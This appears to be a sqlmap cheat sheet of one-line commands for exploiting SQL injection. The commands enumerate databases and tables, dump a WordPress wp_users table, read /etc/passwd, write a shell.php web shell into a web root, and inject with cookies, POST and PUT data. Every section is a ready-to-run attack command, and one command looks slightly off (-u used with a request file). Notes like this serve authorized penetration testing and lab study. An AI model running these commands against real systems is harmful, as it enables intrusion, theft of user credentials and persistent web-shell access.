
### Find Databases:

```bash
sqlmap -r request.txt --dbs --batch
```

### Find Tables in a Database:

```bash
sqlmap -r request.txt --batch --dbms=mysql -D wordpress --tables
```

### Dumping Information from  a Table

```bash
sqlmap -r request.txt --batch --dbms=mysql -D wordpress -T wp_users --dump
```

### Read Files:

```bash
sqlmap -r request.txt --file-read=/etc/passwd --batch 
```

### Write Files:

```bash
sqlmap -u request.txt --file-write=/root/Desktop/shell.php --file-dest=/var/html/www/shell.php --batch
```

### Using a cookie:

```bash
sqlmap -u http://example.com --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

or:

```bash
sqlmap -u http://example.com -H 'PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

### Using POST:

```bash
sqlmap -u www.example.com --data='id=1'
```

### Using PUT:

```bash
sqlmap -u www.example.com --data='id=1' --method PUT
```
### Store the Traffic

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

### Specify Union Columns:

```bash
sqlmap -r sql1.txt --batch --dump --union-cols=5
```